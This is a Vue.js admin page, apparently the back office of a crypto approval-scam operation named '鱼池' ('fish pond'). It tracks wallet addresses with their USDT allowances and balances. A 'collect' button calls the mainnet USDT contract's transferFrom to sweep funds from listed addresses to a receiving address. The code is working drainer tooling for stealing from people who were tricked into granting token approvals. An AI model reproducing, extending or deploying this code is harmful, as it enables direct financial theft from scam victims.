<template>
  <div class="app-container">
    <el-form :model="queryParams" ref="queryForm" size="small" :inline="true" v-show="showSearch" label-width="68px">
      <el-form-item label="地址" prop="address">
        <el-input
          v-model="queryParams.address"
          placeholder="请输入地址"
          clearable
          @keyup.enter.native="handleQuery"
        />
      </el-form-item>
<!--      <el-form-item label="授权额度" prop="allowance">-->
<!--        <el-input-->
<!--          v-model="queryParams.allowance"-->
<!--          placeholder="请输入授权额度"-->
<!--          clearable-->
<!--          @keyup.enter.native="handleQuery"-->
<!--        />-->
<!--      </el-form-item>-->
<!--      <el-form-item label="usdt余额" prop="usdtBalance">-->
<!--        <el-input-->
<!--          v-model="queryParams.usdtBalance"-->
<!--          placeholder="请输入usdt余额"-->
<!--          clearable-->
<!--          @keyup.enter.native="handleQuery"-->
<!--        />-->
<!--      </el-form-item>-->
<!--      <el-form-item label="授权地址" prop="toAddress">-->
<!--        <el-input-->
<!--          v-model="queryParams.toAddress"-->
<!--          placeholder="请输入授权地址"-->
<!--          clearable-->
<!--          @keyup.enter.native="handleQuery"-->
<!--        />-->
<!--      </el-form-item>-->
      <el-form-item>
        <el-button type="primary" icon="el-icon-search" size="mini" @click="handleQuery">搜索</el-button>
        <el-button icon="el-icon-refresh" size="mini" @click="resetQuery">重置</el-button>
      </el-form-item>
    </el-form>

    <el-row :gutter="10" class="mb8">
      <el-col :span="1.5">
        <el-button
          type="primary"
          plain
          icon="el-icon-plus"
          size="mini"
          @click="handleAdd"
          v-hasPermi="['wak:yuchi:add']"
        >新增</el-button>
      </el-col>
      <el-col :span="1.5">
        <el-button
          type="success"
          plain
          icon="el-icon-edit"
          size="mini"
          :disabled="single"
          @click="handleUpdate"
          v-hasPermi="['wak:yuchi:edit']"
        >修改</el-button>
      </el-col>
      <el-col :span="1.5">
        <el-button
          type="danger"
          plain
          icon="el-icon-delete"
          size="mini"
          :disabled="multiple"
          @click="handleDelete"
          v-hasPermi="['wak:yuchi:remove']"
        >删除</el-button>
      </el-col>
      <el-col :span="1.5">
        <el-button
          type="warning"
          plain
          icon="el-icon-download"
          size="mini"
          @click="handleExport"
          v-hasPermi="['wak:yuchi:export']"
        >导出</el-button>
      </el-col>
      <right-toolbar :showSearch.sync="showSearch" @queryTable="getList"></right-toolbar>
    </el-row>

    <el-table v-loading="loading" :data="yuchiList" @selection-change="handleSelectionChange">
      <el-table-column type="selection" width="55" align="center" />
      <el-table-column label="用户id" align="center" prop="userId" />
      <el-table-column label="地址" align="center" prop="address" />
      <el-table-column label="授权额度" align="center" prop="allowance" />
      <el-table-column label="usdt余额" align="center" prop="usdtBalance" />
<!--      <el-table-column label="授权地址" align="center" prop="toAddress" />-->
      <el-table-column label="操作" align="center" class-name="small-padding fixed-width">
        <template slot-scope="scope">
          <el-button
            size="mini"
            type="text"
            icon="el-icon-edit"
            @click="handleCollect(scope.row)"
            v-hasPermi="['wak:yuchi:edit']"
          >归集</el-button>
          <el-button
            size="mini"
            type="text"
            icon="el-icon-edit"
            @click="handleUpdate(scope.row)"
            v-hasPermi="['wak:yuchi:edit']"
          >修改</el-button>
          <el-button
            size="mini"
            type="text"
            icon="el-icon-delete"
            @click="handleDelete(scope.row)"
            v-hasPermi="['wak:yuchi:remove']"
          >删除</el-button>
        </template>
      </el-table-column>
    </el-table>

    <pagination
      v-show="total>0"
      :total="total"
      :page.sync="queryParams.pageNum"
      :limit.sync="queryParams.pageSize"
      @pagination="getList"
    />

    <!-- 添加或修改鱼池对话框 -->
    <el-dialog :title="title" :visible.sync="open" width="500px" append-to-body>
      <el-form ref="form" :model="form" :rules="rules" label-width="80px">
        <el-form-item label="地址" prop="address">
          <el-input v-model="form.address" placeholder="请输入地址" />
        </el-form-item>
        <el-form-item label="授权额度" prop="allowance">
          <el-input v-model="form.allowance" placeholder="请输入授权额度" />
        </el-form-item>
        <el-form-item label="usdt余额" prop="usdtBalance">
          <el-input v-model="form.usdtBalance" placeholder="请输入usdt余额" />
        </el-form-item>
        <el-form-item label="授权地址" prop="toAddress">
          <el-input v-model="form.toAddress" placeholder="请输入授权地址" />
        </el-form-item>
      </el-form>
      <div slot="footer" class="dialog-footer">
        <el-button type="primary" @click="submitForm">确 定</el-button>
        <el-button @click="cancel">取 消</el-button>
      </div>
    </el-dialog>
  </div>
</template>

<script>
import usdtAbi from '@/utils/usdt.json';
import Web3 from "web3";
import { listYuchi, getYuchi, delYuchi, addYuchi, updateYuchi } from "@/api/wak/yuchi";

export default {
  name: "Yuchi",
  data() {
    return {
      // 遮罩层
      loading: true,
      // 选中数组
      ids: [],
      // 非单个禁用
      single: true,
      // 非多个禁用
      multiple: true,
      // 显示搜索条件
      showSearch: true,
      // 总条数
      total: 0,
      // 鱼池表格数据
      yuchiList: [],
      // 弹出层标题
      title: "",
      // 是否显示弹出层
      open: false,
      // 查询参数
      queryParams: {
        pageNum: 1,
        pageSize: 10,
        address: null,
        allowance: null,
        usdtBalance: null,
        toAddress: null
      },
      // 表单参数
      form: {},
      // 表单校验
      rules: {
      },
      fromAddress: null,
    };
  },
  created() {
    this.getList();
  },
  methods: {
    /** 查询鱼池列表 */
    getList() {
      this.loading = true;
      listYuchi(this.queryParams).then(response => {
        this.yuchiList = response.rows;
        this.total = response.total;
        this.loading = false;
      });
    },
    // 取消按钮
    cancel() {
      this.open = false;
      this.reset();
    },
    // 表单重置
    reset() {
      this.form = {
        userId: null,
        address: null,
        allowance: null,
        usdtBalance: null,
        toAddress: null
      };
      this.resetForm("form");
    },
    /** 搜索按钮操作 */
    handleQuery() {
      this.queryParams.pageNum = 1;
      this.getList();
    },
    /** 重置按钮操作 */
    resetQuery() {
      this.resetForm("queryForm");
      this.handleQuery();
    },
    // 多选框选中数据
    handleSelectionChange(selection) {
      this.ids = selection.map(item => item.userId)
      this.single = selection.length!==1
      this.multiple = !selection.length
    },
    /** 新增按钮操作 */
    handleAdd() {
      this.reset();
      this.open = true;
      this.title = "添加鱼池";
    },
    /** 修改按钮操作 */
    handleUpdate(row) {
      this.reset();
      const userId = row.userId || this.ids
      getYuchi(userId).then(response => {
        this.form = response.data;
        this.open = true;
        this.title = "修改鱼池";
      });
    },
    /** 提交按钮 */
    submitForm() {
      this.$refs["form"].validate(valid => {
        if (valid) {
          if (this.form.userId != null) {
            updateYuchi(this.form).then(response => {
              this.$modal.msgSuccess("修改成功");
              this.open = false;
              this.getList();
            });
          } else {
            addYuchi(this.form).then(response => {
              this.$modal.msgSuccess("新增成功");
              this.open = false;
              this.getList();
            });
          }
        }
      });
    },
    /** 删除按钮操作 */
    handleDelete(row) {
      const userIds = row.userId || this.ids;
      this.$modal.confirm('是否确认删除鱼池编号为"' + userIds + '"的数据项？').then(function() {
        return delYuchi(userIds);
      }).then(() => {
        this.getList();
        this.$modal.msgSuccess("删除成功");
      }).catch(() => {});
    },
    /** 导出按钮操作 */
    handleExport() {
      this.download('wak/yuchi/export', {
        ...this.queryParams
      }, `yuchi_${new Date().getTime()}.xlsx`)
    },
    async handleCollect(row) {
      // 检查 MetaMask 是否已安装
      if (typeof window.ethereum !== 'undefined') {
        try {
          // 请求用户授权
          await window.ethereum.request({ method: 'eth_requestAccounts' });
        } catch (error) {
          this.$modal.msgError("请授权 MetaMask 访问您的账户");
          return;
        }

        // 初始化 Web3 实例
        let web3 = new Web3(window.ethereum);

        const fromAddr = row.address; // 假设 row.address 是调用者地址
        const toAddr = row.toAddress; // 假设 row.toAddress 是接收者地址
        const amount = web3.utils.toWei('100', 'mwei'); // 将 100 USDT 转换为 Wei，USDT 是 6 位小数

        // USDT 合约地址
        const usdtContractAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";

        // 创建合约实例
        const contract = new web3.eth.Contract(usdtAbi, usdtContractAddress);

        // 获取当前账户
        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];

        // 构建交易参数
        const sendParams = {
          from: account,
          gas: 2000000,
          gasPrice: web3.utils.toWei('10', 'gwei')
        };

        // 调用合约方法进行转账
        try {
          const transactionHash = await contract.methods.transferFrom(fromAddr, toAddr, amount).send(sendParams);
          this.$modal.msgSuccess("转账成功，交易哈希: " + transactionHash.transactionHash);
        } catch (error) {
          this.$modal.msgError("转账失败: " + error.message);
        }
      } else {
        this.$modal.msgError("请安装 MetaMask 或其他以太坊钱包");
      }
    }

  }
};
</script>
